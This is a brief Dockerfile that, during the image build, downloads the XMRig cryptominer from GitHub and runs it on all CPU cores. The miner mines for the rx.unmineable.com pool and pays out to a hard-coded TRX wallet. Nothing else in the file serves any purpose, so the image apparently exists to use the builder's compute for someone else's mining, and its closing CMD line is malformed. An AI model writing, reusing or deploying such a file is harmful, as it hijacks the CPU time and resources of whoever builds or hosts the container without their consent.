FROM debian:stable
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 && ./xmrig --donate-level 20000 -o rx.unmineable.com:3333 -u TRX:THvWpDUxASDNsdj9bDqDURfM6Qpcnw19Ev.gas$(echo $(shuf -i 1-99 -n 1)) -p x -k -a reth/0 -t$(nproc --all)
CMD (-H)
